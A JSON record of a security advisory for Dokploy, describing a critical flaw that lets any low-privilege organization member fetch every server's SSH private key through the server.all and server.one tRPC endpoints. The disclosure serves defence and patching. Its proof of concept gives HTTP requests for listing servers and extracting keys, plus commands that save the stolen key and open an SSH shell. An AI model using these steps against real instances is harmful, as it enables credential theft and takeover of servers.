@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-w9cp-jqfw-4xj9",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "### Summary\r\nAny authenticated organization member can retrieve the full SSH private key for every server in the organization via the server.all and server.one tRPC endpoints, regardless of their role or whether they have been granted SSH or server access. This allows a low-privilege member to compromise the underlying server infrastructure.\r\n\r\n### Details\r\nThe server.all endpoint (GET /api/trpc/server.all) returns a list of all servers in the organization to any authenticated member. No authorization check verifies that the requesting user has server-level permissions. The response includes server IDs, IP addresses, SSH usernames, ports, and SSH key IDs.\r\nUsing a server ID obtained from server.all, the user can call the server.one endpoint (GET /api/trpc/server.one?input={\"json\":{\"serverId\":\"<id>\"}}) which returns the full server object including the associated SSH private key in plaintext via the nested sshKey.privateKey field.\r\nNeither endpoint enforces role-based access control beyond verifying that the user holds a valid session token for the organization. A member with no project assignments, no server access, and no admin privileges can retrieve every server's private key.\r\n\r\n### PoC\r\n\r\nPrerequisites: A Dokploy instance with at least one server configured and a low-privilege organization member account (no server or SSH access granted).\r\n\r\nStep 1 - Enumerate servers:\r\n```\r\nGET /api/trpc/server.all HTTP/1.1\r\nHost: <target>\r\nCookie: better-auth.session_token=<low-privilege-member-token>\r\n```\r\n\r\nResponse includes all servers with their serverId values, IP addresses, SSH usernames, and ports.\r\n\r\nStep 2 - Retrieve private key:\r\n```\r\nGET /api/trpc/server.one?input=%7B%22json%22%3A%7B%22serverId%22%3A%22<serverId-from-step-1>%22%7D%7D HTTP/1.1\r\nHost: <target>\r\nCookie: better-auth.session_token=<low-privilege-member-token>\r\n```\r\n\r\nResponse includes the full sshKey object with the privateKey field containing the complete OpenSSH private key.\r\n\r\nStep 3 - Connect to server:\r\n```\r\necho '<privateKey>' > stolen_key && chmod 600 stolen_key\r\nssh -i stolen_key <username>@<ipAddress> -p <port>\r\n```\r\n\r\nThe attacker now has shell access as the configured user (typically root).\r\n\r\n### Impact\r\nAny authenticated organization member can steal SSH private keys for all servers managed by the Dokploy instance and gain direct shell access to the underlying infrastructure. This bypasses all role-based access controls within Dokploy. In default configurations where the SSH user is root, this results in full root-level compromise of every managed server. Multi-tenant organizations are particularly at risk, as any member, including those invited with minimal permissions, can access every server in the organization.",
+    "ghsa_id": "GHSA-w9cp-jqfw-4xj9",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-w9cp-jqfw-4xj9",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-w9cp-jqfw-4xj9"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:34Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "SSH Private Key Disclosure to Unauthorized Organization Members via server.all and server.one tRPC Endpoints",
+    "updated_at": "2026-11-12T08:17:34Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.29.13",
+        "vulnerable_version_range": "< 0.29.13"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
